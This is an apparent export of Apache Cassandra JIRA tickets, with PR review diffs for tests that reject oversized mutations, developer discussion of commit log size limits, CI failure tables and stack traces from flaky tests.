-        ColumnFamilyStore cfs = ks.getColumnFamilyStore(STANDARD1);
-        Mutation rm = new RowUpdateBuilder(cfs.metadata(), 0, ""k"")
-                      .clustering(""bytes"")
-                      .add(""val"", ByteBuffer.allocate(1 + getMaxRecordDataSize()))
-                      .build();
-        long cnt = CommitLog.instance.metrics.oversizedMutations.getCount();
-        try
-        {
-            CommitLog.instance.add(rm);
-        }
-        catch (MutationExceededMaxSizeException e)
-        {
-            assertEquals(cnt + 1, CommitLog.instance.metrics.oversizedMutations.getCount());
-            throw e;
-        }
-        throw new AssertionError(""mutation larger than limit was accepted"");
-    }
-    @Test
-    public void testExceedRecordLimitWithMultiplePartitions() throws Exception
-    {
-        CommitLog.instance.resetUnsafe(true);
-        List<Mutation> mutations = new ArrayList<>();
-        Keyspace ks = Keyspace.open(KEYSPACE1);
-        char[] keyChars = new char[MutationExceededMaxSizeException.PARTITION_MESSAGE_LIMIT];
-        Arrays.fill(keyChars, 'k');
-        String key = new String(keyChars);
-
-        // large mutation
-        mutations.add(new RowUpdateBuilder(ks.getColumnFamilyStore(STANDARD1).metadata(), 0, key)
-                      .clustering(""bytes"")
-                      .add(""val"", ByteBuffer.allocate(1 + getMaxRecordDataSize()))
-                      .build());
-
-        // smaller mutation
-        mutations.add(new RowUpdateBuilder(ks.getColumnFamilyStore(STANDARD2).metadata(), 0, key)
-                      .clustering(""bytes"")
-                      .add(""val"", ByteBuffer.allocate(1 + getMaxRecordDataSize() - 1024))
-                      .build());
-
-        Mutation mutation = Mutation.merge(mutations);
-        try
-        {
-            CommitLog.instance.add(Mutation.merge(mutations));
-            throw new AssertionError(""mutation larger than limit was accepted"");
-        }
-        catch (MutationExceededMaxSizeException exception)
-        {
-            String message = exception.getMessage();
-
-            long mutationSize = mutation.serializedSize(MessagingService.current_version) + ENTRY_OVERHEAD_SIZE;

Review Comment:
   Done in [5d7f657](https://github.com/apache/cassandra/pull/1588/commits/5d7f657cd1a3c8a5d841e99d1a3d670c0efddd53).



##########
test/distributed/org/apache/cassandra/distributed/test/OversizedMutationTest.java:
##########
@@ -0,0 +1,79 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test;
+
+import org.apache.commons.lang3.StringUtils;
+import org.junit.Test;
+
+import org.apache.cassandra.distributed.Cluster;
+
+import static org.apache.cassandra.distributed.api.ConsistencyLevel.ALL;
+import static org.junit.Assert.assertEquals;
+import static org.junit.Assert.fail;
+
+public class OversizedMutationTest extends TestBaseImpl
+{
+    @Test
+    public void testSingleOversizedMutation() throws Throwable
+    {
+        try (Cluster cluster = init(builder().withNodes(1).withConfig(c -> c.set(""max_mutation_size_in_kb"", 48))
+                                             .start()))
+        {
+            cluster.schemaChange(withKeyspace(""CREATE TABLE %s.t (key int PRIMARY KEY, val blob)""));
+            String payload = StringUtils.repeat('1', 1024 * 49);
+            String query = ""INSERT INTO %s.t (key, val) VALUES (1, textAsBlob('"" + payload + ""'))"";
+            try
+            {
+                cluster.coordinator(1).execute(withKeyspace(query), ALL);
+                fail(""An error should have been thrown but was not."");
+            }
+            catch (Throwable e)
+            {
+                String msg = ""Rejected an oversized mutation (50233/49152) for keyspace: distributed_test_keyspace. Top keys are: t.1"";
+                assertEquals(msg, e.getMessage());
+            }

Review Comment:
   Done in [5d7f657](https://github.com/apache/cassandra/pull/1588/commits/5d7f657cd1a3c8a5d841e99d1a3d670c0efddd53).



##########
test/distributed/org/apache/cassandra/distributed/test/OversizedMutationTest.java:
##########
@@ -0,0 +1,79 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test;
+
+import org.apache.commons.lang3.StringUtils;
+import org.junit.Test;
+
+import org.apache.cassandra.distributed.Cluster;
+
+import static org.apache.cassandra.distributed.api.ConsistencyLevel.ALL;
+import static org.junit.Assert.assertEquals;
+import static org.junit.Assert.fail;
+
+public class OversizedMutationTest extends TestBaseImpl
+{
+    @Test
+    public void testSingleOversizedMutation() throws Throwable
+    {
+        try (Cluster cluster = init(builder().withNodes(1).withConfig(c -> c.set(""max_mutation_size_in_kb"", 48))
+                                             .start()))
+        {
+            cluster.schemaChange(withKeyspace(""CREATE TABLE %s.t (key int PRIMARY KEY, val blob)""));
+            String payload = StringUtils.repeat('1', 1024 * 49);
+            String query = ""INSERT INTO %s.t (key, val) VALUES (1, textAsBlob('"" + payload + ""'))"";
+            try
+            {
+                cluster.coordinator(1).execute(withKeyspace(query), ALL);
+                fail(""An error should have been thrown but was not."");
+            }
+            catch (Throwable e)
+            {
+                String msg = ""Rejected an oversized mutation (50233/49152) for keyspace: distributed_test_keyspace. Top keys are: t.1"";
+                assertEquals(msg, e.getMessage());
+            }
+        }
+    }
+
+    @Test
+    public void testOversizedBatch() throws Throwable
+    {
+        try (Cluster cluster = init(builder().withNodes(1).withConfig(c -> c.set(""max_mutation_size_in_kb"", 48))
+                                             .start()))
+        {
+            cluster.schemaChange(withKeyspace(""CREATE KEYSPACE ks1 WITH replication = {'class': 'SimpleStrategy', 'replication_factor': 1};""));
+            cluster.schemaChange(withKeyspace(""CREATE TABLE ks1.t (key int PRIMARY KEY, val blob)""));
+            String payload = StringUtils.repeat('1', 1024 * 48);
+            String query = ""BEGIN BATCH\n"" +
+                           ""INSERT INTO ks1.t (key, val) VALUES (1, textAsBlob('"" + payload + ""'))\n"" +
+                           ""INSERT INTO ks1.t (key, val) VALUES (2, textAsBlob('222'))\n"" +
+                           ""APPLY BATCH"";
+            try
+            {
+                cluster.coordinator(1).execute(withKeyspace(query), ALL);
+                fail(""An error should have been thrown but was not."");
+            }
+            catch (Throwable e)
+            {
+                String msg = ""Rejected an oversized mutation (49209/49152) for keyspace: ks1. Top keys are: t.1"";
+                assertEquals(msg, e.getMessage());
+            }

Review Comment:
   Done in [5d7f657](https://github.com/apache/cassandra/pull/1588/commits/5d7f657cd1a3c8a5d841e99d1a3d670c0efddd53).



;26/Apr/22 11:56;githubbot;600","Gerrrr commented on code in PR #1588:
URL: https://github.com/apache/cassandra/pull/1588#discussion_r858623444


##########
test/distributed/org/apache/cassandra/distributed/test/OversizedMutationTest.java:
##########
@@ -0,0 +1,79 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test;
+
+import org.apache.commons.lang3.StringUtils;
+import org.junit.Test;
+
+import org.apache.cassandra.distributed.Cluster;
+
+import static org.apache.cassandra.distributed.api.ConsistencyLevel.ALL;
+import static org.junit.Assert.assertEquals;
+import static org.junit.Assert.fail;
+
+public class OversizedMutationTest extends TestBaseImpl
+{
+    @Test
+    public void testSingleOversizedMutation() throws Throwable
+    {
+        try (Cluster cluster = init(builder().withNodes(1).withConfig(c -> c.set(""max_mutation_size_in_kb"", 48))

Review Comment:
   Done in [5d7f657](https://github.com/apache/cassandra/pull/1588/commits/5d7f657cd1a3c8a5d841e99d1a3d670c0efddd53).



;26/Apr/22 11:56;githubbot;600","Gerrrr merged PR #186:
URL: https://github.com/apache/cassandra-dtest/pull/186


;09/May/22 09:04;githubbot;600","smiklosovic closed pull request #1588: CASSANDRA-17456 trunk: Reject oversized mutations on client and internode connection
URL: https://github.com/apache/cassandra/pull/1588


;09/May/22 10:12;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,4200,,,0,4200,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17164,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,Gerrrr,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon May 09 17:07:12 UTC 2022,,,,,,,All,,,,"0|z10mhc:",9223372036854775807,,,,adelapena,jmckenzie,,,Normal,,4.1,,Committed as 9f3bc657273dfa9e20d233636adf662904f01f34 to 4.1 and 11bdf1bf8038fa7f872fe9161a0568d023e6cfac to trunk.,,,,,,,,,I made the existing dtest applicable to C* versions until 4.0.x and added an in-jvm dtest to cover rejection of oversized mutations on insert.,,,,,"18/Mar/22 20:08;e.dimitrova;CC [~benedict] ;;;","19/Mar/22 09:09;benedict;FWIW, I think this may be a real bug that has been present for years. It's not clear what our semantics are with respect to max mutation size - seemingly we should reject them entirely at the client level, but for some reason we do not. We do not seem to declare our behaviour clearly anywhere. However, historically we could not durably record them in the commit log, so we should presumably not be recording them in the hints file either - but we are, and have been for a long time.

Probably what we should really do is to default to a much larger max mutation size, reject client operations that exceed it entirely, and have the commit log support any size of mutation (by just allocating a dedicated segment). Perhaps we already do, in fact, and that explains this divergence? I'm not sure, I'm out of date.;;;","19/Mar/22 11:38;brandon.williams;bq. seemingly we should reject them entirely at the client level, but for some reason we do not.

I agree here since the oversized mutations can still affect the heap, which with G1 can cause a Humongous Allocation and wreck it.  This is why I reduced the native frame size in CASSANDRA-16886, but this is also why we should try not to record them as much as possible, so I'm not fond of the idea of allowing any size since we'll surely be allocating at some point.;;;","22/Mar/22 12:51;benedict;Yes, to be clear I meant only to remove the _CommitLog_ size restrictions, and move the size restriction to one that is entirely imposed on the client connection. Increasing the default permitted size would be a way to minimise the chance of this change breaking applications when introduced, without modifying the default commit log behaviour. Though I would be fine to simply move to rejecting the oversized mutations at the client connection (and perhaps also internode) without any other changes.;;;","22/Apr/22 14:21;Gerrrr;As Benedict suggested, I moved the mutation size check from CommitLog to the client and internode connections.

Patches:
 * [17456-trunk|https://github.com/apache/cassandra/compare/trunk...Gerrrr:17456-trunk?expand=1]
 * [dtest|https://github.com/apache/cassandra-dtest/pull/186]

[Jenkins CI run|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1626/#showFailuresLink];;;","25/Apr/22 16:40;adelapena;Looks good to me, here is a CircleCI run including some repeated runs of the new in-JVM dtest on the multiplexer:
||Patch||CircleCI||
|[trunk|https://github.com/adelapena/cassandra/commit/f2bb81f9d26ca0281990861c9b72ba0809c7723c]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1504/workflows/530f2000-55e0-4416-9beb-24cfc198f477] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1504/workflows/cf2da305-3246-4355-8c22-30ccddcc664c]|
I have also left a couple of small suggestions on [the PR|https://github.com/apache/cassandra/pull/1588].;;;","26/Apr/22 12:08;adelapena;CI for the last changes:
||Patch||CircleCI||
|[trunk|https://github.com/adelapena/cassandra/commit/f2bb81f9d26ca0281990861c9b72ba0809c7723c]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1506/workflows/bda95759-cf93-4900-bb56-b4be8edb8083] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1506/workflows/c3de011c-7a7e-4514-b377-c52cbf144b24]|;;;","27/Apr/22 15:41;jmckenzie;+1 here. We should maybe consider adding an entry to NEWS.txt to indicate the change from {{RuntimeException}} on {{MutationExceededMaxSizeException}} to {{{}InvalidRequestException{}}}.
 
I can't really imagine there's a lot of tooling in place out in the world that relies on the exception type being thrown on mutations exceeding max allowable sizes but stranger things have happened.;;;","27/Apr/22 16:57;jmckenzie;Follow up thought - this moves our check up the stack in terms of where we look for oversized mutations. Maybe we should add back in the size check in the {{CommitLog.add}} call as a kind of ""last protection"" (with a new log message to reflect the unexpected nature of seeing a large mutation there) in case of current unexpected paths or future changes that may introduce large mutations into the system?;;;","27/Apr/22 17:46;benedict;I haven't looked at the patch, but worth noting we should not remove the size check on CommitLog without permitting the allocation of a dedicated segment for the record.;;;","28/Apr/22 19:57;jmckenzie;Note: removing +1, pushing back to patch available. We need to keep oversized mutations out of the CommitLog at the least, and should likely create a follow up ticket to consider allowing allocation of dedicated segments for oversized mutations.;;;","29/Apr/22 10:26;Gerrrr;Looking at the CommitLog code, it will allocate a new segment if the mutation does not fit in the current segment ([link|https://github.com/apache/cassandra/blob/7ce140bd1dea311b9f98cdfbcd07dcff9fbd457c/src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerStandard.java#L52-L57]). This effectively gives us the desired behavior as long as a single mutation fits in a segment or am I missing something?

I can think of one corner case when a mutation is larger than a segment. I can add an assertion for that, just to be on the safe side.;;;","30/Apr/22 12:44;Gerrrr;I've put the size validation back to CommitLog#add and added the NEWS entry.;;;","02/May/22 17:37;jmckenzie;bq. as long as a single mutation fits in a segment 
I think this is the key distinction. If mutations of effectively any size are allowed to get through to {{CommitLogSegmentManager[type].allocate}}, it'll spin forever saying there's not enough room in the segment and just keep on hitting {{advanceAllocatingFrom}} and creating new segments. Which would be no good. :)

So probably best to protect ourselves from that in the future (which I see from your commit you've done).

Back to +1 from me pending CI. You good with it [~adelapena]?;;;","03/May/22 11:25;adelapena;Looks good to me, I have just started repeated runs for both {{OversizedMutationTest}} and {{CommitLogTest}} after rebasing on the new {{cassandra-4.1}} branch without conflicts:

OversizedMutationTest + pre-commit:
 * [j8 |https://app.circleci.com/pipelines/github/adelapena/cassandra/1520/workflows/207ac25e-7a88-4220-8d9d-f752df711450]
 * [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1520/workflows/b58bb268-af63-4272-840c-25f028b3e0f5]

CommitLogTest:
 * [j8 |https://app.circleci.com/pipelines/github/adelapena/cassandra/1521/workflows/cdb34d69-518b-47ed-8e9d-676695fd8296]
 * [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1521/workflows/7b1c1f9b-ad0c-4579-94e2-e7f4a5586567];;;","06/May/22 08:25;Gerrrr;CI looks good. I am moving the issue to ready to commit.;;;","09/May/22 09:04;Gerrrr;Committed as [9f3bc657273dfa9e20d233636adf662904f01f34|https://github.com/apache/cassandra/commit/9f3bc657273dfa9e20d233636adf662904f01f34] to 4.1 and [11bdf1bf8038fa7f872fe9161a0568d023e6cfac|https://github.com/apache/cassandra/commit/11bdf1bf8038fa7f872fe9161a0568d023e6cfac] to trunk.;;;","09/May/22 17:07;jmckenzie;None of the single failures from the ASF CI run below look unaccounted for, and thus are likely not influenced by this patch.

[CI Results]
Branch: 4.1, build number: 9
butler url: [https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1]
jenkins url: [https://ci-cassandra.apache.org/job/Cassandra-4.1/9/]
JIRA: CASSANDRA-17456
commit url: [https://git-wip-us.apache.org/repos/asf?p=cassandra.git;a=commit;h=9f3bc657273dfa9e20d233636adf662904f01f34]
affected paths:
 * src/java/org/apache/cassandra/db/commitlog/CommitLog.java
 * test/unit/org/apache/cassandra/db/commitlog/CommitLogTest.java
 * NEWS.txt
 * src/java/org/apache/cassandra/db/MutationVerbHandler.java
 * src/java/org/apache/cassandra/cql3/statements/SingleTableUpdatesCollector.java
 * test/distributed/org/apache/cassandra/distributed/test/OversizedMutationTest.java
 * src/java/org/apache/cassandra/cql3/statements/BatchUpdatesCollector.java
 * src/java/org/apache/cassandra/db/MutationExceededMaxSizeException.java

Build Result: UNSTABLE
Passing Tests: 48664
Failing Tests: 11
||Test|Failures|JIRA|
|org.apache.cassandra.net.ProxyHandlerConnectionsTest.testExpireSome-cdc|1 of 7|CASSANDRA-17301?|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV4Upgrade_AllVersions_RandomPartitioner_EndsAt_Trunk_HEAD.test_parallel_upgrade_with_internode_ssl|2 of 7|CASSANDRA-17299?|
|org.apache.cassandra.distributed.test.CASTest.testConflictingWritesWithStaleRingInformation|2 of 7|CASSANDRA-17461?|
|org.apache.cassandra.cql3.KeywordTest.test[keyword KEYS isReserved false]|1 of 7|CASSANDRA-17615?|
|org.apache.cassandra.distributed.test.CASTest.testSucccessfulWriteDuringRangeMovementFollowedByRead|3 of 7|CASSANDRA-17461?|
|org.apache.cassandra.db.SinglePartitionSliceCommandTest.testPartitionDeletionRangeDeletionTie|3 of 7|CASSANDRA-17463?|
|org.apache.cassandra.distributed.test.CASTest.testSuccessfulWriteBeforeRangeMovement|1 of 7|CASSANDRA-17461?|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD.test_rolling_upgrade_with_internode_ssl|1 of 7|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*TestProtoV3Upgrade*%22]|
|org.apache.cassandra.db.SinglePartitionSliceCommandTest.testPartitionDeletionRowDeletionTie|1 of 7|CASSANDRA-17463?|
|org.apache.cassandra.db.SinglePartitionSliceCommandTest.testPartitionDeletionRowDeletionTie-cdc|1 of 7|CASSANDRA-17463?|;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Flaky org.apache.cassandra.tools TopPartitionsTest testServiceTopPartitionsSingleTable,CASSANDRA-17455,13434558,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,smiklosovic,smiklosovic,18/Mar/22 11:01,05/Oct/22 22:22,13/Jul/23 08:40,19/May/22 08:06,4.0.5,4.1-beta1,,,,,CI,,,,0,,"{code:java}
Error Messageexpected:<1> but was:<0>Stacktracejunit.framework.AssertionFailedError: expected:<1> but was:<0>
	at org.apache.cassandra.tools.TopPartitionsTest.testServiceTopPartitionsSingleTable(TopPartitionsTest.java:82)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
Standard OutputINFO  [main] 2022-03-17 23:37:01,750 YamlConfigurationLoader.java:103 - Configuration location: file:/home/cassandra/cassandra/test/conf/cassandra.yaml
DEBUG [main] 2022-03-17 23:37:01,754 YamlConfigurationLoader.java:124 - Loading settings from file:/home/cassandra/cassandra/test/conf/cassandra.yaml
INFO  [main] 2022-03-17 23:37:01,878 Config.java:1119 - Node configuration:[allocate_tokens_for_keyspace=null; allocate_tokens_for_local_replication_factor=null; allow_extra_insecure_udfs=false; all
...[truncated 49100 chars]...
lizing counter cache with capacity of 2 MiBs
INFO  [MemtableFlushWriter:1] 2022-03-17 23:37:03,857 CacheService.java:164 - Scheduling counter cache save to every 7200 seconds (going to save all keys).
DEBUG [MemtableFlushWriter:1] 2022-03-17 23:37:03,883 ColumnFamilyStore.java:1249 - Flushed to [BigTableReader(path='/home/cassandra/cassandra/build/test/cassandra/data/system/IndexInfo-9f5c6374d48532299a0a5094af9ad1e3/nb-1-big-Data.db')] (1 sstables, 4.915KiB), biggest 4.915KiB, smallest 4.915KiB {code}",,bereng,jmckenzie,smiklosovic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17798,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bereng,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon May 23 05:48:44 UTC 2022,,,,,,,All,,,,"0|z10m3k:",9223372036854775807,,,,brandon.williams,,,,Normal,,4.0.4,,https://github.com/apache/cassandra/commit/af24242af913b63b29691251025d2aa54e3890bd,,,,,,,,,See PR,,,,,"12/May/22 10:00;bereng;Easy to repro locally by teaking the timeout. I posted a PR. If we +1 the approach I'll create the rest of the PRs.;;;","12/May/22 11:36;brandon.williams;Looks reasonable to me.  It would be nice if we had the ability to loop this in jenkins so we could verify it solves the issue in that environment beforehand, but today is not that day.;;;","13/May/22 06:28;bereng;Pushed all branches. Ready for final review.;;;","18/May/22 06:47;bereng;Ping [~brandon.williams];;;","18/May/22 10:20;brandon.williams;+1;;;","20/May/22 15:07;jmckenzie;Ah; need to tweak something to have it resolve JIRA's; will update comment.
Edit: Fixed

[CI Results]
Branch: 4.1, build number: 28
   butler url: https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1
   jenkins url: https://ci-cassandra.apache.org/job/Cassandra-4.1/28/
   JIRA: CASSANDRA-17455
   commit url: https://git-wip-us.apache.org/repos/asf?p=cassandra.git;a=commit;h=af24242af913b63b29691251025d2aa54e3890bd
   affected paths:
* test/unit/org/apache/cassandra/tools/TopPartitionsTest.java

   Build Result: UNSTABLE
   Passing Tests: 47219
   Failing Tests: 16

||Test|Failures|JIRA||
|distributed.test.NetstatsRepairStreamingTest.testWithCompressionEnabled|1 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|distributed.test.SchemaTest.readRepair|5 of 27|[CASSANDRA-17641?|https://issues.apache.org/jira/browse/CASSANDRA-17641]|
|db.SinglePartitionSliceCommandTest.testPartitionDeletionRowDeletionTie-compression|3 of 27|[CASSANDRA-17463?|https://issues.apache.org/jira/browse/CASSANDRA-17463]|
|tools.nodetool.InvalidateCredentialsCacheTest.testInvalidateSingleCredential-cdc|1 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD.test_parallel_upgrade_with_internode_ssl|1 of 27|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20""*TestProtoV3Upgrade*""]
|cql3.validation.entities.SecondaryIndexTest.testSelectOnMultiIndexOnCollectionsWithNull|1 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|dtest-upgrade.upgrade_tests.cql_tests.TestCQLNodes3RF3_Upgrade_current_3_11_x_To_indev_4_1_x.test_no_range_ghost|1 of 27|[CASSANDRA-17627?|https://issues.apache.org/jira/browse/CASSANDRA-17627]|
|db.commitlog.CommitLogSegmentManagerCDCTest.testNonblockingShouldMaintainSteadyDiskUsage|3 of 27|[CASSANDRA-17542?|https://issues.apache.org/jira/browse/CASSANDRA-17542]|
|schema.SchemaKeyspaceTest.testNoVisiblePartialSchemaUpdates|1 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|cql3.ViewComplexTTLTest.testUpdateColumnInViewPKWithTTLWithFlush[3]|6 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|distributed.upgrade.CompactStorageUpgradeTest.compactStorageImplicitNullInClusteringTest|2 of 27|[CASSANDRA-17213?|https://issues.apache.org/jira/browse/CASSANDRA-17213]|
|distributed.test.NetstatsBootstrapWithoutEntireSSTablesCompressionStreamingTest.testWithoutStreamingEntireSSTablesWithoutCompression|1 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|cql3.ViewFilteringSimplePKTest.testPartitionKeyFilteringWithSlice[3]|2 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|distributed.upgrade.MixedModeReadRepairDeleteTest.mixedModeReadRepairDeletePartition|1 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|db.commitlog.CommitLogSegmentManagerCDCTest.testCompletedFlag|3 of 27|[CASSANDRA-17542?|https://issues.apache.org/jira/browse/CASSANDRA-17542]|
;;;","23/May/22 05:48;bereng;It's all unrelated imo as the fix only touched a timeout in a test.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
flaky in jvm CasCriticalSectionTest.criticalSectionTest,CASSANDRA-17453,13434556,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,marcuse,smiklosovic,smiklosovic,18/Mar/22 10:47,07/Mar/23 11:52,13/Jul/23 08:40,28/Apr/22 07:47,4.1,4.1-alpha1,,,,,CI,,,,0,,"From CI, there are variations of this error:
{code:java}
org.apache.cassandra.exceptions.CasWriteTimeoutException: CAS operation timed out: received 0 of 3 required responses after 0 contention retries at org.apache.cassandra.service.paxos.Paxos$MaybeFailure.markAndThrowAsTimeoutOrFailure(Paxos.java:547) at org.apache.cassandra.service.paxos.Paxos.cas(Paxos.java:732) at org.apache.cassandra.service.paxos.Paxos.cas(Paxos.java:618) at org.apache.cassandra.service.StorageProxy.cas(StorageProxy.java:307) at org.apache.cassandra.cql3.statements.ModificationStatement.executeWithCondition(ModificationStatement.java:500) at org.apache.cassandra.cql3.statements.ModificationStatement.execute(ModificationStatement.java:467) at org.apache.cassandra.distributed.impl.Coordinator.unsafeExecuteInternal(Coordinator.java:122) at org.apache.cassandra.distributed.impl.Coordinator.unsafeExecuteInternal(Coordinator.java:103) at org.apache.cassandra.distributed.impl.Coordinator.lambda$executeWithResult$0(Coordinator.java:66) at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:47) at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:57) at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) at java.base/java.lang.Thread.run(Thread.java:829) {code}",,e.dimitrova,marcuse,smiklosovic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,marcuse,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Apr 27 14:24:16 UTC 2022,,,,,,,All,,,,"0|z10m34:",9223372036854775807,,,,brandon.williams,,,,Normal,,5.0,,https://github.com/apache/cassandra/commit/bcf56629e821295a22371c2cf178faae0636c68e,,,,,,,,,repeated cci run,,,,,"18/Mar/22 19:38;e.dimitrova;Appeared in one of my runs today: 

[https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1480/workflows/c2fa1dbc-74a2-4b8d-b200-185d6ecfd909/jobs/9648/tests#failed-test-0]

I saw it these days a few times, maybe it should be checked with [~benedict] if it can be related to the latest paxos changes? 

 ;;;","26/Apr/22 15:33;marcuse;bumping the timeouts seem to fix this

100x run: https://app.circleci.com/pipelines/github/krummas/cassandra/802/workflows/4ff6be03-bcfc-4aa8-8532-a7e1d340f2c9/jobs/6298

https://github.com/krummas/cassandra/commit/b30628db07021437ed48bf32e86ef5b7115b1609;;;","27/Apr/22 14:24;brandon.williams;+1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
